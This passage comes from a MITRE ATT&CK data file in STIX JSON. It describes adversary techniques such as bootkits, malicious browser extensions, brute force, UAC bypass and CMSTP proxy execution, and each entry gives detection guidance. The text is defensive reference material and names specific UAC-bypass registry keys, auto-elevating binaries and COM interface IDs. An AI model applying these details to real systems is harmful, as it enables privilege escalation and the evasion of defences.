    "{\"created\":\"2017-05-31T21:30:54.661Z\",\"external_references\":[{\"external_id\":\"T1067\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1067\"},{\"description\":\"Mandiant. (2016, February). M-Trends 2016. Retrieved January 4, 2017.\",\"source_name\":\"MTrends 2016\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/regional/fr_FR/offers/pdfs/ig-mtrends-2016.pdf\"},{\"description\":\"Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.\",\"source_name\":\"Lau 2011\",\"url\":\"http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion\"}],\"id\":\"attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d\",\"modified\":\"2020-03-20T19:53:25.628Z\",\"name\":\"Bootkit\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-12-19T21:05:38.123Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\\n\\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\\n\\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\",\"external_references\":[{\"external_id\":\"T1542.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1542/003\"},{\"description\":\"Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.\",\"source_name\":\"Mandiant M Trends 2016\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\"},{\"description\":\"Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.\",\"source_name\":\"Lau 2011\",\"url\":\"http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion\"}],\"id\":\"attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-05-07T22:32:05.335Z\",\"name\":\"Bootkit\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"VBR\",\"MBR\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Host intrusion prevention systems\",\"Anti-virus\",\"File monitoring\"],\"x_mitre_detection\":\"Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\\n\\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\\n\\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.\",\"external_references\":[{\"external_id\":\"T1217\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1217\"}],\"id\":\"attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T16:06:07.367Z\",\"name\":\"Browser Bookmark Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Mike Kemmerer\"],\"x_mitre_data_sources\":[\"API monitoring\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser\'s app store and generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\\n\\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials) (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence.\\n\\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).\",\"external_references\":[{\"external_id\":\"T1176\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1176\"},{\"description\":\"Wikipedia. (2017, October 8). Browser Extension. Retrieved January 11, 2018.\",\"source_name\":\"Wikipedia Browser Extension\",\"url\":\"https://en.wikipedia.org/wiki/Browser_extension\"},{\"description\":\"Chrome. (n.d.). What are Extensions?. Retrieved November 16, 2017.\",\"source_name\":\"Chrome Extensions Definition\",\"url\":\"https://developer.chrome.com/extensions\"},{\"description\":\"Jagpal, N., et al. (2015, August). Trends and Lessons from Three Years Fighting Malicious Extensions. Retrieved November 17, 2017.\",\"source_name\":\"Malicious Chrome Extension Numbers\",\"url\":\"https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf\"},{\"description\":\"Brinkmann, M. (2017, September 19). First Chrome extension with JavaScript Crypto Miner detected. Retrieved November 16, 2017.\",\"source_name\":\"Chrome Extension Crypto Miner\",\"url\":\"https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/\"},{\"description\":\"De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL BUSINESSES. Retrieved January 17, 2018.\",\"source_name\":\"ICEBRG Chrome Extensions\",\"url\":\"https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses\"},{\"description\":\"Marinho, R. (n.d.). (Banker(GoogleChromeExtension)).targeting. Retrieved November 18, 2017.\",\"source_name\":\"Banker Google Chrome Extension Steals Creds\",\"url\":\"https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/\"},{\"description\":\"Marinho, R. (n.d.). \\\"Catch-All\\\" Google Chrome Malicious Extension Steals All Posted Data. Retrieved November 16, 2017.\",\"source_name\":\"Catch All Chrome Extension\",\"url\":\"https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/)\"},{\"description\":\"Vachon, F., Faou, M. (2017, July 20). Stantinko: A massive adware campaign operating covertly since 2012. Retrieved November 16, 2017.\",\"source_name\":\"Stantinko Botnet\",\"url\":\"https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/\"},{\"description\":\"Kjaer, M. (2016, July 18). Malware in the browser: how you might get hacked by a Chrome extension. Retrieved November 22, 2017.\",\"source_name\":\"Chrome Extension C2 Malware\",\"url\":\"https://kjaer.io/extension-malware/\"}],\"id\":\"attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-25T23:36:30.565Z\",\"name\":\"Browser Extensions\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Justin Warner, ICEBRG\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\",\"Process use of network\",\"Process monitoring\",\"Browser extensions\"],\"x_mitre_detection\":\"Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\\n\\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:31:22.767Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\",\"external_references\":[{\"external_id\":\"T1110\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1110\"},{\"external_id\":\"CAPEC-49\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/49.html\"}],\"id\":\"attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-29T20:35:55.382Z\",\"name\":\"Brute Force\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"Office 365 account logs\",\"Authentication logs\"],\"x_mitre_detection\":\"Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"Azure AD\",\"SaaS\",\"GCP\",\"AWS\",\"Azure\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-01-30T14:24:34.977Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\\n\\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\\n\\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\\n\\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\\n\\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)\",\"external_references\":[{\"external_id\":\"T1548.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1548/002\"},{\"description\":\"Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.\",\"source_name\":\"TechNet How UAC Works\",\"url\":\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works\"},{\"description\":\"Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.\",\"source_name\":\"TechNet Inside UAC\",\"url\":\"https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx\"},{\"description\":\"Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.\",\"source_name\":\"MSDN COM Elevation\",\"url\":\"https://msdn.microsoft.com/en-us/library/ms679687.aspx\"},{\"description\":\"Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.\",\"source_name\":\"Davidson Windows\",\"url\":\"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\"},{\"description\":\"UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.\",\"source_name\":\"Github UACMe\",\"url\":\"https://github.com/hfiref0x/UACME\"},{\"description\":\"Nelson, M. (2016, August 15). \\\"Fileless\\\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.\",\"source_name\":\"enigma0x3 Fileless UAC Bypass\",\"url\":\"https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\"},{\"description\":\"Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.\",\"source_name\":\"Fortinet Fareit\",\"url\":\"https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware\"},{\"description\":\"Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.\",\"source_name\":\"SANS UAC Bypass\",\"url\":\"http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass\"},{\"description\":\"Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.\",\"source_name\":\"enigma0x3 sdclt app paths\",\"url\":\"https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\"},{\"description\":\"Nelson, M. (2017, March 17). \\\"Fileless\\\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.\",\"source_name\":\"enigma0x3 sdclt bypass\",\"url\":\"https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\"}],\"id\":\"attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-25T19:57:54.510Z\",\"name\":\"Bypass User Access Control\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\",\"Casey Smith\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\"],\"x_mitre_detection\":\"There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\\n\\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\\n\\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\\n\\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command\\\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\\n\\nAnalysts should monitor these Registry settings for unauthorized changes.\",\"x_mitre_effective_permissions\":[\"Administrator\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:07.462Z\",\"external_references\":[{\"external_id\":\"T1088\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1088\"},{\"description\":\"Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.\",\"source_name\":\"TechNet How UAC Works\",\"url\":\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works\"},{\"description\":\"Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.\",\"source_name\":\"TechNet Inside UAC\",\"url\":\"https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx\"},{\"description\":\"Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.\",\"source_name\":\"MSDN COM Elevation\",\"url\":\"https://msdn.microsoft.com/en-us/library/ms679687.aspx\"},{\"description\":\"Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.\",\"source_name\":\"Davidson Windows\",\"url\":\"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\"},{\"description\":\"UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.\",\"source_name\":\"Github UACMe\",\"url\":\"https://github.com/hfiref0x/UACME\"},{\"description\":\"Nelson, M. (2016, August 15). \\\"Fileless\\\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.\",\"source_name\":\"enigma0x3 Fileless UAC Bypass\",\"url\":\"https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\"},{\"description\":\"Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.\",\"source_name\":\"Fortinet Fareit\",\"url\":\"https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware\"},{\"description\":\"Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.\",\"source_name\":\"SANS UAC Bypass\",\"url\":\"http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass\"},{\"description\":\"Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.\",\"source_name\":\"enigma0x3 sdclt app paths\",\"url\":\"https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\"},{\"description\":\"Nelson, M. (2017, March 17). \\\"Fileless\\\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.\",\"source_name\":\"enigma0x3 sdclt bypass\",\"url\":\"https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\"}],\"id\":\"attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be\",\"modified\":\"2020-02-05T20:08:32.863Z\",\"name\":\"Bypass User Account Control\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1191\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1191\"},{\"description\":\"Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018.\",\"source_name\":\"Microsoft Connection Manager Oct 2009\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)\"},{\"description\":\"Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018.\",\"source_name\":\"Twitter CMSTP Usage Jan 2018\",\"url\":\"https://twitter.com/ItsReallyNick/status/958789644165894146\"},{\"description\":\"Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018.\",\"source_name\":\"MSitPros CMSTP Aug 2017\",\"url\":\"https://msitpros.com/?p=3960\"},{\"description\":\"Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018.\",\"source_name\":\"Twitter CMSTP Jan 2018\",\"url\":\"https://twitter.com/NickTyrer/status/958450014111633408\"},{\"description\":\"Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.\",\"source_name\":\"GitHub Ultimate AppLocker Bypass List\",\"url\":\"https://github.com/api0cradle/UltimateAppLockerByPassList\"},{\"description\":\"Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.\",\"source_name\":\"Endurant CMSTP July 2018\",\"url\":\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\"}],\"id\":\"attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3\",\"modified\":\"2020-01-31T18:58:17.078Z\",\"name\":\"CMSTP\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T18:27:30.656Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\\n\\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.\\n\\nCMSTP.exe can also be abused to [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)\",\"external_references\":[{\"external_id\":\"T1218.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/003\"},{\"description\":\"Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018.\",\"source_name\":\"Microsoft Connection Manager Oct 2009\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)\"},{\"description\":\"Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018.\",\"source_name\":\"Twitter CMSTP Usage Jan 2018\",\"url\":\"https://twitter.com/ItsReallyNick/status/958789644165894146\"},{\"description\":\"Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018.\",\"source_name\":\"MSitPros CMSTP Aug 2017\",\"url\":\"https://msitpros.com/?p=3960\"},{\"description\":\"Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018.\",\"source_name\":\"Twitter CMSTP Jan 2018\",\"url\":\"https://twitter.com/NickTyrer/status/958450014111633408\"},{\"description\":\"Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.\",\"source_name\":\"GitHub Ultimate AppLocker Bypass List\",\"url\":\"https://github.com/api0cradle/UltimateAppLockerByPassList\"},{\"description\":\"Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.\",\"source_name\":\"Endurant CMSTP July 2018\",\"url\":\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\"}],\"id\":\"attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:34:03.247Z\",\"name\":\"CMSTP\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Nik Seetharaman, Palantir\",\"Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank\"],\"x_mitre_data_sources\":[\"Windows event logs\",\"Process use of network\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\\n\\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\\n\\n* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\\n* To detect [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-24T22:30:55.843Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\\n\\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\\n\\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 